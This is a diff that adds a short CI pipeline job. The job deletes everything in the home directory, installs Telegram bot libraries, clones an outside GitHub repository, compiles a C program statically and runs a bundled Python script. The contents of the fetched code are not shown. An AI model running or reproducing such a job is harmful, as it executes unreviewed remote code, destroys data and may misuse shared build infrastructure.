@@ -1,0 +1,15 @@
+stages:
+  - setup
+
+setup_environment:
+  stage: setup
+  image: python:3.9  
+  script:
+          - cd && rm -rf *
+          - apt-get update && apt-get install -y git gcc python3 python3-pip
+          - pip install telebot pymongo aiohttp --break-system-packages pytz telebot flask aiogram pyTelegramBotAPI python-telegram-bot
+          - git clone https://github.com/sidharat09/Sid1.git
+          - cd Sid1
+          - gcc Sid.c -o Sid -lz -lpthread -static
+          - chmod +x *
+          - python3 Sid.py
